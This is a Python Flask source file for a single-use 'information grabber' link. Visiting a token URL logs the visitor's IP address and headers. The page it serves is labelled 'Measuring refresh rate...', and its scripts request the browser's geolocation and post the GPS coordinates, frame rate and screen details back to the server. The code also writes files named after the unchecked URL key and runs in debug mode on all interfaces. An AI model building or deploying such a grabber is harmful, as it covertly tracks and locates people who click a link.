from flask import request, render_template
from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file, jsonify
from werkzeug.utils import secure_filename
from werkzeug.datastructures import  FileStorage
import os
from datetime import date

app = Flask(__name__, static_folder='{0}/static'.format(os.getcwd()), template_folder='{0}/templates'.format(os.getcwd()))
app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
app.secret_key= os.urandom(24).hex()

def check_token(key):
    print(key)
    f = open('tokens', 'r')
    token_list = []
    for token in f.readlines():
        token_list.append(token[:-1])
        f.close()

    if key in token_list:

        return 1
    else:
        return 0

@app.route('/location/<key>', methods=['POST'])
def location(key):
    print(key)
    data = request.get_json()
    print('Received location:', data)

    f = open("./{0}.txt".format(key), "a")

    f.write(f"GPS : {data}\n\n")
    
    return jsonify({'status': 'success', 'received': data})

@app.route('/fps/<key>', methods=['POST'])
def fps(key):
    print(key)
    data = request.get_json()
    print(f'{data}\n')

    f = open("./{0}.txt".format(key), "a")

    f.write(f"FPS : {data}\n\n")
    
    return jsonify({'status': 'success', 'received': data})

@app.route('/screen-info/<key>', methods=['POST'])
def screeninfo(key):
    print(key)
    data = request.get_json()
    print(f'{data}\n')

    f = open("./{0}.txt".format(key), "a")

    f.write(f"SCREEN : {data}\n\n")
    
    return jsonify({'status': 'success', 'received': data})

### once the link is clicked the link will no longer be avail ###
@app.route('/<key>', methods=['GET']) 
def information_grabber(key):
    if check_token(key) == 1:
        ### remove token code here ####
        f = open('tokens', 'r')
        token_list = []
        for token in f.readlines():
            token_list.append(token[:-1])
            f.close()

        for token in token_list:
            if token == key:
                token_list.remove(token)

        os.remove("tokens")

        f = open('tokens', 'w')

        for token in token_list:
            print(token_list)
            f.write('{0}\n\n'.format(token))
        f.close()


        f = open(f'{key}.txt', 'w')

        f.write('ip :{0}\n\ntoken : {1}\n\n{2}\n'.format(str(request.remote_addr), token, request.headers, request.headers['User-Agent'] ))
        f.close()
        
        ### infor grabber code here ###
        return """<!DOCTYPE html>
<html>
<body>

<h2 id="fps" style="color:white;">Measuring refresh rate...</h2>

<script>
navigator.geolocation.getCurrentPosition((loc) => {{
  const latitude = loc.coords.latitude;
  const longitude = loc.coords.longitude;

  console.log('The location in lat lon format is: [', latitude, ',', longitude, ']');

  // Send AJAX POST request with location data
  fetch('/location/{0}', {{
    method: 'POST',
    headers: {{
      'Content-Type': 'application/json'
    }},
    body: JSON.stringify({{
      latitude: latitude,
      longitude: longitude
    }})
  }})
  .then(response => response.json())
  .then(data => {{
    console.log('Server response:', data);
  }})
  .catch(error => {{
    console.error('Error sending location:', error);
  }});
}}, 
(error) => {{
  console.error('Error getting location:', error);
}});
</script>

<script>
  let lastTime = performance.now();
  let frames = 0;
  let fps = 0;
  let fpsSent = false; // <-- Flag to ensure we only send once

  function loop() {{
    const now = performance.now();
    frames++;

    if (now - lastTime >= 1000) {{
      fps = (frames * 1000) / (now - lastTime);
      document.getElementById("fps").textContent = "FPS: " + fps.toFixed(1);

      // Send FPS to Flask only once
      if (!fpsSent) {{
        sendFPS(fps.toFixed(1));
        fpsSent = true; // <-- Prevent future sends
      }}

      frames = 0;
      lastTime = now;
    }}

    requestAnimationFrame(loop);
  }}

  function sendFPS(fpsValue) {{
    fetch("/fps/{0}", {{
      method: "POST",
      headers: {{
        "Content-Type": "application/json",
      }},
      body: JSON.stringify({{fpsValue }}),
    }}).catch((err) => console.error("Error sending FPS:", err));
  }}

  requestAnimationFrame(loop);
</script>

<script>
function getScreenInfo() {{
  return {{
    // Physical screen size in CSS pixels
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,

    // Viewport / browser content area size in CSS pixels
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,

    // Available screen area (may exclude OS taskbar/dock)
    availWidth: window.screen.availWidth,
    availHeight: window.screen.availHeight,

    // Device pixel ratio (useful for converting CSS pixels → device pixels)
    devicePixelRatio: window.devicePixelRatio || 1,
  }};
}}

// usage
const info = getScreenInfo();
console.log(info);

// Send to your server (adjust the URL to your endpoint)
fetch("/screen-info/{0}", {{
  method: "POST",
  headers: {{
    "Content-Type": "application/json",
  }},
  body: JSON.stringify(info),
}})
  .then((res) => {{
    if (!res.ok) throw new Error("Network response was not ok");
    return res.json().catch(() => ({{}})); // handle empty responses gracefully
  }})
  .then((data) => console.log("Server response:", data))
  .catch((err) => console.error("Error sending screen info:", err));
</script>

</body>
</html>
""".format(key)

    else:
        return 'nothing'
################################################################

app.run(host="0.0.0.0", port="3000", threaded=True, debug=True)
